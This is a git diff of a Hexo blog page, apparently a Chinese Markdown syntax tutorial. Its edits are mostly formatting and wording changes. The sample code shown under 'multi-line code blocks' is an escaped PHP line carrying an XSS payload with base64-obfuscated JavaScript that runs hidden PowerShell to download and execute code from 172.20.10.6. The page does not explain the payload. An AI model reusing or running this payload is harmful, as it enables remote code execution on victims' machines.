@@ -484,15 +484,14 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="0x01-分级标题"><a href="#0x01-分级标题" class="headerlink" title="0x01 分级标题"></a>0x01 分级标题</h2><h1 id="标题一"><a href="#标题一" class="headerlink" title="标题一"></a>标题一</h1><h2 id="标题二"><a href="#标题二" class="headerlink" title="标题二"></a>标题二</h2><h3 id="标题三"><a href="#标题三" class="headerlink" title="标题三"></a>标题三</h3><h4 id="标题四"><a href="#标题四" class="headerlink" title="标题四"></a>标题四</h4><h5 id="标题五"><a href="#标题五" class="headerlink" title="标题五"></a>标题五</h5><h6 id="标题六"><a href="#标题六" class="headerlink" title="标题六"></a>标题六</h6><h2 id="0x02-字体设置斜体、粗体、删除线、下划线、上下标"><a href="#0x02-字体设置斜体、粗体、删除线、下划线、上下标" class="headerlink" title="0x02 字体设置斜体、粗体、删除线、下划线、上下标"></a>0x02 字体设置斜体、粗体、删除线、下划线、上下标</h2><p>正常文字<br><em>斜体</em><br><em>斜体</em><br><strong>粗体</strong><br><em><strong>斜体加粗</strong></em><br><del>删除线</del><br><u>下划线</u><br>Markdown<sup>上标</sup><br>Markdown<sub>下标</sub></p>
-<h2 id="0x03-插入图片"><a href="#0x03-插入图片" class="headerlink" title="0x03 插入图片"></a>0x03 插入图片</h2><h3 id="1-插入本地图片"><a href="#1-插入本地图片" class="headerlink" title="(1)插入本地图片"></a>(1)插入本地图片</h3><p>注意：图片描述可以不用写</p>
-<ul>
+<h2 id="0x03-插入图片"><a href="#0x03-插入图片" class="headerlink" title="0x03 插入图片"></a>0x03 插入图片</h2><h3 id="1-插入本地图片"><a href="#1-插入本地图片" class="headerlink" title="(1)插入本地图片"></a>(1)插入本地图片</h3><ul>
 <li>解决本地图片无法显示：</li>
 </ul>
-<p>不能直接使用<code>npm install hexo-asset-image</code>安装依赖，需要指定依赖地址<code>npm install https://github.com/xcodebuild/hexo-asset-image --save</code>，然后把_config.yml中的<code>post_asset_folder</code>设为<code>true</code><br><img src="/2022/04/27/markdown/pic.jpg" alt="本地图片描述"></p>
-<h3 id="2-插入网络图片"><a href="#2-插入网络图片" class="headerlink" title="(2)插入网络图片"></a>(2)插入网络图片</h3><p><img src="https://w.wallhaven.cc/full/e7/wallhaven-e7ek7k.jpg" alt="网络图片描述"></p>
-<h2 id="0x04-插入链接"><a href="#0x04-插入链接" class="headerlink" title="0x04 插入链接"></a>0x04 插入链接</h2><p>可以直接写，或是用&lt;&gt;包围起来，Markdown会把它转成链接<br><a target="_blank" rel="noopener" href="https://du8848.github.io/">https://du8848.github.io</a><br><a target="_blank" rel="noopener" href="https://du8848.github.io/">https://du8848.github.io</a></p>
+<p>不能直接使用<code>npm install hexo-asset-image</code>安装依赖，需要指定依赖地址<code>npm install https://github.com/xcodebuild/hexo-asset-image --save</code>，然后把_config.yml中的<code>post_asset_folder</code>设为<code>true</code><br><img src="/2022/04/27/markdown/pic.jpg" alt="本地图片描述，可以不写"></p>
+<h3 id="2-插入网络图片"><a href="#2-插入网络图片" class="headerlink" title="(2)插入网络图片"></a>(2)插入网络图片</h3><p><img src="https://w.wallhaven.cc/full/e7/wallhaven-e7ek7k.jpg" alt="网络图片描述，可以不写"></p>
+<h2 id="0x04-插入链接"><a href="#0x04-插入链接" class="headerlink" title="0x04 插入链接"></a>0x04 插入链接</h2><p>可以直接写，或是用<code>&lt;&gt;</code>包围起来，Markdown会把它转成链接<br><a target="_blank" rel="noopener" href="https://du8848.github.io/">https://du8848.github.io</a><br><a target="_blank" rel="noopener" href="https://du8848.github.io/">https://du8848.github.io</a></p>
 <h2 id="0x05-插入超链接"><a href="#0x05-插入超链接" class="headerlink" title="0x05 插入超链接"></a>0x05 插入超链接</h2><p><a target="_blank" rel="noopener" href="https://du8848.github.io/" title="鼠标悬停要显示的文字">github地址</a></p>
-<h2 id="0x06-分隔线"><a href="#0x06-分隔线" class="headerlink" title="0x06 分隔线"></a>0x06 分隔线</h2><p>可以在一行中用三个以上的星号(*)、减号(-)、底线(_)来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。<br>注意：使用减号(-)作分隔线时前面最好空一行</p>
+<h2 id="0x06-分隔线"><a href="#0x06-分隔线" class="headerlink" title="0x06 分隔线"></a>0x06 分隔线</h2><p>可以在一行中用三个以上的星号<code>*</code>、减号<code>-</code>、底线<code>_</code>来建立一个分隔线，行内不能有其他东西。你也可以在星号<code>*</code>或是减号<code>-</code>中间插入空格。<br>注意：使用减号<code>-</code>作分隔线时前面最好空一行</p>
 <hr>
 <p>分隔线</p>
 <hr>
@@ -508,7 +507,7 @@
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="2-行内代码："><a href="#2-行内代码：" class="headerlink" title="(2) 行内代码："></a>(2) 行内代码：</h3><p>如果在一个行内需要引用代码，只要用反引号`引起来就好</p>
 <p>语法展示<code>Markdown</code>行内代码</p>
-<h3 id="3-多行代码块与语法高亮："><a href="#3-多行代码块与语法高亮：" class="headerlink" title="(3)多行代码块与语法高亮："></a>(3)多行代码块与语法高亮：</h3><p>在需要高亮的代码块的前一行及后一行使用三个单反引号“`”包裹</p>
+<h3 id="3-多行代码块与语法高亮："><a href="#3-多行代码块与语法高亮：" class="headerlink" title="(3)多行代码块与语法高亮："></a>(3)多行代码块与语法高亮：</h3><p>在需要高亮的代码块的前一行及后一行使用三个单反引号`包裹</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 	header(&quot;HTTP&#x2F;1.1 500 &lt;img src&#x3D;x onerror&#x3D;&#39;eval(new Buffer(&#96;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3Bvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgaGlkZGVuIC1jICJJRVggKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKFwnaHR0cDovLzE3Mi4yMC4xMC42OjgwL2FcJykpIicsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnthbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTt9KTs&#x3D;&#96;,&#96;base64&#96;).toString())&#39;&gt;&quot;);
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -526,15 +525,15 @@
 	&lt;&#x2F;tr&gt;
 &lt;&#x2F;table&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="0x08-列表"><a href="#0x08-列表" class="headerlink" title="0x08 列表"></a>0x08 列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>使用 *，+，- 表示无序列表，符号后面一定要有一个空格，起到缩进的作用</p>
+<h2 id="0x08-列表"><a href="#0x08-列表" class="headerlink" title="0x08 列表"></a>0x08 列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>使用 <code>*</code>，<code>+</code>，<code>-</code>表示无序列表，符号后面一定要有一个空格，起到缩进的作用</p>
 <ul>
-<li>*号表示的无序列表</li>
+<li><code>*</code>号表示的无序列表</li>
 </ul>
 <ul>
-<li>+号表示的无序列表</li>
+<li><code>+</code>号表示的无序列表</li>
 </ul>
 <ul>
-<li>-号表示的无序列表</li>
+<li><code>-</code>号表示的无序列表</li>
 </ul>
 <h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>使用数字和一个英文句点表示有序列表，英文句点后面一定要有一个空格，起到缩进的作用</p>
 <ol>
@@ -582,7 +581,17 @@
 <td align="right">59</td>
 </tr>
 </tbody></table>
-<h2 id="0x10-字体、字号和颜色"><a href="#0x10-字体、字号和颜色" class="headerlink" title="0x10 字体、字号和颜色"></a>0x10 字体、字号和颜色</h2>
+<h2 id="0x10-文字引用"><a href="#0x10-文字引用" class="headerlink" title="0x10 文字引用"></a>0x10 文字引用</h2><p>使用<code>&gt;</code>表示引用，可以有多个<code>&gt;</code>，引用符号越多表示层级越深</p>
+<blockquote>
+<p>一层引用</p>
+<blockquote>
+<p>二层引用<br>跳不出去</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>空一行就跳出去了</p>
+</blockquote>
+<h2 id="0x11-字体、字号和颜色"><a href="#0x11-字体、字号和颜色" class="headerlink" title="0x11 字体、字号和颜色"></a>0x11 字体、字号和颜色</h2>
                 
             </div>
             <hr/>
